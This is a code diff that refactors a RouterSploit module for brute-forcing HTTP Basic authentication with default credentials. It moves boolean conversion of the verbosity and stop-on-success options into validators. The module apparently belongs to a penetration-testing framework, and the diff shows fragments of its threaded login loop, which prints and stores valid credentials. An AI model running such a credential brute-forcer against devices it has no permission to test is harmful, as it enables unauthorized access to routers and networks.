@@ -7,7 +7,6 @@ from routersploit import (
     print_error,
     print_success,
     print_table,
-    boolify,
     http_request,
     multi,
     validators,
@@ -42,8 +41,8 @@ class Exploit(exploits.Exploit):
     threads = exploits.Option(8, 'Number of threads')
     defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
     path = exploits.Option('/', 'URL Path')
-    verbosity = exploits.Option('yes', 'Display authentication attempts')
-    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')
+    verbosity = exploits.Option('yes', 'Display authentication attempts', validators=validators.boolify)
+    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt', validators=validators.boolify)
 
     credentials = []
 
@@ -83,7 +82,6 @@ class Exploit(exploits.Exploit):
         defaults.close()
 
     def target_function(self, user, password):
-        module_verbosity = boolify(self.verbosity)
         name = threading.current_thread().name
         url = "{}:{}{}".format(self.target, self.port, self.path)
 
@@ -93,9 +91,9 @@ class Exploit(exploits.Exploit):
         response = http_request(method="GET", url=url, auth=(user, password))
 
         if response.status_code != 401:
-            print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
+            print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
             self.credentials.append((self.target, self.port, user, password))
-            if boolify(self.stop_on_success):
+            if self.stop_on_success:
                 raise StopThreadPoolExecutor
         else:
-            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
+            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=self.verbosity)
